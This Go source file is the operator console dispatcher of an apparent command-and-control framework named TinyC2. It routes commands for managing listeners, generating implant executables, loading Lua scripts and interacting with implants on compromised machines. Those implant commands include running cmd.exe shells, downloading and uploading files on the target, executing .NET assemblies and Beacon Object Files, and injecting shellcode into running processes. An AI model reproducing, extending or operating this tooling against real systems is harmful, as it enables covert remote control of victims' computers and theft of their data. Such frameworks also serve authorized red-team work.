package cli

import (
	"fmt"
	"strings"

	"github.com/0xPrimo/TinyC2/server/internal/cli/handlers"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	lua "github.com/yuin/gopher-lua"
)

func (c *Cli) Executor(in string) {
	in = strings.TrimSpace(in)
	if in == "" {
		return
	}

	// Implant interaction commands
	//
	args := strings.Split(in, " ")
	command := args[0]
	cmdargs := args[1:]

	if c.SessionID != 0 {
		switch command {
		case "channel":
			handlers.HandleImplantChannel(c.Engine, &c.SessionID, cmdargs)
		case "ps":
			handlers.HandleImplantPs(c.Engine, &c.SessionID, cmdargs)
		case "cd":
			handlers.HandleImplantCd(c.Engine, &c.SessionID, cmdargs)
		case "cp":
			handlers.HandleImplantCp(c.Engine, &c.SessionID, cmdargs)
		case "shell":
			handlers.HandleImplantShell(c.Engine, &c.SessionID, cmdargs)
		case "download":
			handlers.HandleImplantDownload(c.Engine, &c.SessionID, cmdargs)
		case "upload":
			handlers.HandleImplantUpload(c.Engine, &c.SessionID, cmdargs)
		case "run":
			handlers.HandleImplantRun(c.Engine, &c.SessionID, cmdargs)
		case "execute-assembly":
			handlers.HandleImplantExecuteAssembly(c.Engine, &c.SessionID, cmdargs)
		case "job":
			handlers.HandleImplantJob(c.Engine, &c.SessionID, cmdargs)
		case "inline-execute":
			handlers.HandleImplantInlineExecute(c.Engine, &c.SessionID, cmdargs)
		case "inject-shellcode":
			handlers.HandleImplantInjectShellcode(c.Engine, &c.SessionID, cmdargs)
		case "back":
			c.SessionID = 0
		case "help":
			logger.Info(
				`Usage:
	    channel                                       - Manage channels
	       register [name]                            - Register channel
	       switch   [name]                            - Switch channel
	       remove   [name]                            - Remove channel
	       list                                       - List channels
	                -----------------------------
	    job
	       stop   [id]                                - Stop job
	       list                                       - List jobs
	                -----------------------------
	    ps                                            - List process
	    cd                                            - Change process working directory
	    cp                                            - Copy file to target directory
	    shell                                         - Run a shell command via cmd.exe
	    download                                      - Download file from target machine
	    upload                                        - Upload file to target machine
	    run                                           - Run executable that exits on target machine
	    execute-assembly                              - Run a .NET application
	    inline-execute                                - Run a Beacon Object File
        shellcode-inject                              - Inject shellcode into running process
	    back                                          - Exit interactive mode
	    help                                          - Print help menu
	`,
			)
		case "exit":
			handlers.HandleExit(c.Engine, cmdargs)
		default:

			for _, cmds := range c.UserCommands {
				for _, cmd := range cmds {
					if cmd.Name == command {
						c.L.Push(cmd.Callback)
						c.L.Push(lua.LNumber(c.SessionID))
						for _, arg := range cmdargs {
							c.L.Push(lua.LString(arg))
						}

						if err := c.L.PCall(len(cmdargs)+1, 0, nil); err != nil {
							fmt.Printf("Failed to run script: %v\n", err)
						}
						return
					}
				}
			}

			fmt.Printf("Unknown command: %s\n", command)
			return
		}
		return
	}

	switch command {
	case "plugin":
		handlers.HandlePlugin(c.Engine, cmdargs)
	case "listener":
		handlers.HandleListener(c.Engine, cmdargs)
	case "implant":
		handlers.HandleImplant(c.Engine, &c.SessionID, cmdargs)
	case "script_load":
		if len(cmdargs) < 1 {
			logger.Error("need arguments")
			return
		}
		c.HandleScriptLoad(cmdargs[0])
	case "script_unload":
		if len(cmdargs) < 1 {
			logger.Error("need arguments")
			return
		}
		c.HandleScriptUnload(cmdargs[0])

	case "help":
		logger.Info(
			`Usage:
      implant                                       - Manage implants
         interact [id]                              - Interact with implant
         kill     [id]                              - Kill implant
         list                                       - List implants

      plugin                                        - Manage plugins
         register [name] [plugin.so]                - Register listener plugin
         remove   [name]                            - Remove listener plugin
         list                                       - List plugins

      listener                                      - Manage listeners
         generate [name] [dest]						- Generate implant (EXE)
	     start    [plugin] [name] [config.yaml]     - Start listener
         stop     [name]                            - Stop listener
         list                                       - List listeners
		
	  script_load   [path]                          - Load lua script
	  script_unload [path]                          - Unload lua script
      help                                          - Print help menu
`,
		)
	case "exit":
		handlers.HandleExit(c.Engine, cmdargs)
	default:
		fmt.Printf("Unknown command: %s\n", command)
		return
	}
}

func (c *Cli) HandleScriptLoad(path string) {
	if err := c.L.DoFile(string(path)); err != nil {
		logger.Error("failed to run script: %v", err)
	}

	logger.Info("Script loaded")
}

func (c *Cli) HandleScriptUnload(path string) {
	delete(c.UserCommands, path)

	logger.Info("Script unloaded")
}
